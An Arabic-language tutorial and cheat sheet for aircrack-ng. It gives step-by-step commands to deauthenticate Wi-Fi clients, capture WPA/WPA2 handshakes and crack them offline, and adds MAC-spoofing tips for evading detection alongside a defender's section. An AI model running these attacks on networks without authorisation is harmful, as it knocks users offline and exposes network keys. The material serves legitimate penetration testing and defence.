# aircrack-ng — الدليل الكامل لاختبار اختراق الشبكات اللاسلكية

تُعد `aircrack-ng` المجموعة الكلاسيكية والأكثر شهرة في مجال مهاجمة الشبكات اللاسلكية (Wi-Fi). توفر هذه المجموعة أدوات متكاملة لوضع المراقبة (Monitor Mode)، وفصل الاتصال (Deauth)، وحقن الحزم، والتقاط المصافحة (Handshake Capture)، وكسر التشفير دون اتصال (Offline Cracking). تظل هذه الأدوات فعالة جداً ضد بروتوكولات WPA/WPA2-PSK، بينما حلت محلها أدوات مثل `hcxtools` في التعامل مع مسارات العمل الخاصة بـ WPA3 و PMKID.

## التثبيت (Install)

```terminal
apt install aircrack-ng
brew install aircrack-ng    # دعم محدود على macOS؛ يفضل استخدام Linux
```

يجب أن يدعم محول الشبكة اللاسلكية (Wireless Adapter) **وضع المراقبة (Monitor Mode)** و **حقن الحزم (Packet Injection)**. تأكد من ذلك باستخدام الأمر `iw list` وابحث عن أوضاع `monitor`, `mp`, `mp-active`. المحولات الموصى بها تشمل: Alfa AWUS036ACS, AWUS036NHA, Panda PAU09.

## مجموعة الأدوات (The toolkit)

| الأداة | الغرض |
|------|---------|
| `airmon-ng` | وضع بطاقة الشبكة في وضع المراقبة (Monitor Mode) |
| `airodump-ng` | التقاط الإطارات (Frames) وعرض نقاط الوصول والعملاء |
| `aireplay-ng` | حقن الحزم (Deauth, Fake-auth, Replay) |
| `aircrack-ng` | كسر تشفير WEP / WPA-PSK من ملفات الالتقاط |
| `airbase-ng` | إنشاء نقطة وصول وهمية (Rogue AP) |
| `airdecap-ng` | فك تشفير الملفات الملتقطة عند توفر المفتاح |

## مسار العمل القياسي — التقاط مصافحة WPA/WPA2-PSK

### 1. وضع المراقبة (Monitor mode)

```terminal
sudo airmon-ng check kill           # إنهاء العمليات التي قد تسبب تداخلاً (wpa_supplicant)
sudo airmon-ng start wlan0          # إنشاء واجهة جديدة باسم wlan0mon
```

### 2. الاستطلاع (Survey)

```terminal
sudo airodump-ng wlan0mon
# يعرض BSSID  PWR  Beacons  Data  CH  ENC  ESSID  STATION (المتصلين)
```

اختر الهدف — ودوّن الـ BSSID والقناة (Channel).

### 3. الالتقاط المستهدف (Targeted capture)

```terminal
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
# سيتم كتابة ملفات الالتقاط ببادئة "handshake"
```

### 4. إجبار المصافحة — فصل اتصال عميل نشط

```terminal
# في نافذة أوامر أخرى:
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c <CLIENT-MAC> wlan0mon
```

عندما يعاود العميل الاتصال، سيتم التقاط المصافحة الرباعية (4-way handshake). ستظهر عبارة `WPA handshake: AA:BB:...` في أعلى نافذة `airodump-ng`.

### 5. كسر التشفير دون اتصال (Crack offline)

```terminal
aircrack-ng -w rockyou.txt handshake-01.cap
# أو باستخدام hashcat (أسرع):
hcxpcapngtool -o handshake.hc22000 handshake-01.cap
hashcat -m 22000 handshake.hc22000 rockyou.txt
```

## أنماط Aireplay-ng (Aireplay-ng modes)

| النمط | الوظيفة |
|------|--------------|
| `--deauth N -a <bssid>` | إرسال N من إطارات فصل الاتصال |
| `--fakeauth ` | ارتباط وهمي بنقطة الوصول (خاص بـ WEP) |
| `--arpreplay` | إعادة إرسال طلبات ARP (لتجميع IVs في WEP) |
| `--chopchop` / `--fragment` | هجمات قلب البتات (خاصة بـ WEP) |
| `--caffe-latte` | مهاجمة العميل مباشرة (WEP، لا حاجة لنقطة وصول) |
| `--migmode` | إعادة إرسال حزم WPA في وضع الهجرة (Migration mode) |
| `--test` | اختبار قدرة بطاقة الشبكة على حقن الحزم |

## خيارات Airodump-ng (Airodump-ng options)

| الخيار (Flag) | الغرض |
|------|---------|
| `-c <ch>` | تثبيت القناة (منع التنقل التلقائي) |
| `--bssid <mac>` | التصفية لاستهداف نقطة وصول واحدة فقط |
| `-w <prefix>` | تحديد بادئة اسم ملف الالتقاط |
| `--essid <name>` | التصفية حسب اسم الشبكة |
| `--manufacturer` | عرض الشركة المصنعة بناءً على OUI |
| `-d <ch_list>` | قائمة القنوات للتنقل المتعدد |
| `--wps` | عرض حالة تقنية WPS |

## أبرز مخرجات الأداة (Good output)

```
CH  6 ][ Elapsed: 18 s ][ 2026-04-30 11:33

 BSSID              PWR Beacons  #Data  #/s CH  MB   ENC  CIPHER AUTH ESSID
 AA:BB:CC:DD:EE:FF  -45     180     12    2   6 270  WPA2 CCMP   PSK  Acme-Corp
 11:22:33:44:55:66  -65      90      0    0  11 270  WPA2 CCMP   PSK  Guest

 BSSID              STATION            PWR  Rate    Lost  Frames  Notes
 AA:BB:CC:DD:EE:FF  AC:DE:48:00:11:22  -55  0 -24       0      45  WPA handshake: AA:BB:CC:DD:EE:FF
```

سطر `WPA handshake` يؤكد جودة عملية الالتقاط؛ بدونه ستفشل عملية الكسر.

بعد تشغيل `aircrack-ng`:

```
KEY FOUND! [ Spring2026! ]

Master Key     : 78 5A 3B ...
Transient Key  : 8F 4D ...
EAPOL HMAC     : 23 11 ...
```

## المشاكل التقنية والحلول (Bad output and fixes)

| العرض (Symptom) | الحل |
|---------|-----|
| فشل `airmon-ng start` | البطاقة لا تدعم وضع المراقبة — استخدم مجموعة شرائح (Chipset) معروفة |
| لا يوجد تأثير لـ Deauth | المسافة أو ضعف الإشارة؛ تفعيل PMF (802.11w) يحظر Deauth — انتقل لهجوم PMKID |
| العميل يظهر ولكن لا توجد مصافحة | تحتاج لعملية ارتباط جديدة — انتظر أو كرر Deauth |
| `aircrack-ng` لم يجد شبكات | ملف الالتقاط لا يحتوي على إطارات EAPOL — أعد الالتقاط |
| عملية الكسر بطيئة على المعالج | استخدم `hashcat -m 22000` على المعالج الرسومي (GPU) |

## منظور الدفاع (Defender's perspective)

- رشقات من إطارات Deauth من عنوان MAC لا يتبع لنقطة الوصول = هجوم كلاسيكي على الواي فاي.
- أنظمة WIDS (مثل Cisco, Aruba, Mist) تكتشف هذه الهجمات لحظياً.
- يجب على المؤسسات الحديثة تفعيل **802.11w (PMF)** لجعل هجمات Deauth غير فعالة.
- استخدام WPA3 مع SAE يلغي تماماً إمكانية كسر المصافحة دون اتصال.

## أمن العمليات (OPSEC)

- قم بتغيير عنوان الـ MAC الخاص بك: `macchanger -r wlan0mon`.
- هجمات Deauth تنتشر فيزيائياً — ويمكن رصدها بواسطة حراس مراقبة الترددات اللاسلكية (RF).
- بروتوكول WPA3 مع PMF يجعل هذا المسار قديماً؛ استخدم `hcxdumptool` لمحاولات PMKID فقط في البيئات المختلطة.

## أدوات ذات صلة (Related tools)

| الأداة | التخصص |
|------|-------|
| **hcxdumptool / hcxtools** | استهداف PMKID (لا حاجة لعميل متصل) ودعم WPA3 |
| **bettercap** | أداة حديثة تعتمد على القوائم للواي فاي والبلوتوث و HID |
| **wifite2** | أداة مؤتمتة تجمع كافة تقنيات الهجوم بواجهة TUI |
| **kismet** | استطلاع الشبكات اللاسلكية وأنظمة IDS |
| **fluxion** | أتمتة هجمات التوأم الشرير (Evil-twin) والصفحات المزورة |
| **eaphammer** | مهاجمة شبكات WPA-Enterprise (PEAP/MSCHAPv2) |
